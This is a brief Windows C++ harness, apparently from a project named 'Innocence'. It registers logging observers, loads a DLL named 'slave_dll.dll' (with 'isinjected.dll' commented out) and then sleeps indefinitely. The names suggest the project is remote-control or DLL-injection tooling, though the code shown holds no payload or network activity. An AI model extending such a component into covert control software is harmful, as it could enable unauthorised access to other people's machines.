#include <windows.h>
#include <common/Innocence.hpp>
#include <log/Log.hpp>
#include <audit/Audit.hpp>

int submain(int argc, char ** argv)
{
	try
	{
		LOG.setIdentity(Common::identity);
		LOG.addObserver(new Log::LogToConsole);
		LOG.addObserver(new Log::LogToCollector);
		LOG.addObserver(new Audit::LogToAuditor);

		// Chargement normal de la DLL
		HMODULE hModule = LoadLibrary("slave_dll.dll");
		//HMODULE hModule = LoadLibrary("isinjected.dll");
		Sleep(INFINITE);
	}
	catch(Common::Exception&)
	{
	}
	CATCH_UNKNOWN_EXCEPTION
	return 0;
}

INNOCENCE_MAIN